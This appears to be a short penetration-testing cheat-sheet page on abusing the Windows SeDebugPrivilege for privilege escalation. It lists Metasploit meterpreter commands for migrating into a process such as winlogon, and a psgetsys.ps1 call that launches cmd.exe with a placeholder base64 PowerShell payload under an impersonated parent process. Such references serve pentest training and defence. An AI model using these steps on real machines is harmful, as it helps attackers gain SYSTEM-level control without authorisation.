---
title: "SeDebugPrivilege"
date: 2024-8-2
tags: ["SeDebugPrivilege", "Windows", "potato", "privesc", "fullpower"]
---

### Tools

{{< tab set1 tab1 active >}}Metasploit{{< /tab >}}
{{< tab set1 tab2 >}}psgetsys.ps1{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```console
# Inside meterpreter
ps winlogon
```

```console
# Explorer.exe is a good candidate
migrate <PID>
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

<div>

```console
# Import module
. .\psgetsys.ps1
```

```console
ImpersonateFromParentPid -ppid <PID> -command "c:\windows\system32\cmd.exe" -cmdargs "/c <POWERSHELL_3_BASE64>"
```

</div>

<small>*Ref: [psgetsys](https://github.com/decoder-it/psgetsystem)*</small>

{{< /tabcontent >}}

<br>